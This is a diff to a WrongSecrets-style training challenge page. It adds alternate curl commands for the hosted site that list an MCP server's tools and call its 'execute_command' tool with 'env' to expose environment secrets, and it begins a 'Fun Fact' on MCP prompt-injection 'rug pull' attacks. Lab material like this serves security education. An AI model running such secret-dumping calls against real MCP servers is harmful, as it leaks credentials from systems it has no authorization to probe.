@@ -22,6 +22,16 @@ curl -s -X POST http://localhost:8090/mcp \
   -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
 ----
 
+_Note_: working from wwww.wrongsecrets.com? Then please use
+
+[source,bash]
+----
+curl -s -X POST https://wrongsecrets.com/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
+----
+
+
 Then, call the `execute_command` tool to retrieve environment variables and find the secret:
 
 [source,bash]
@@ -30,6 +40,16 @@ curl -s -X POST http://localhost:8090/mcp \
   -H 'Content-Type: application/json' \
   -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
 ----
+
+_Note_: working from wwww.wrongsecrets.com? Then please use
+
+[source,bash]
+----
+curl -s -X POST https://wrongsecrets.com/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
+----
+
 
 ****
 🤖 *Fun Fact — MCP Prompt Injection ("MCP Rug Pull"):*
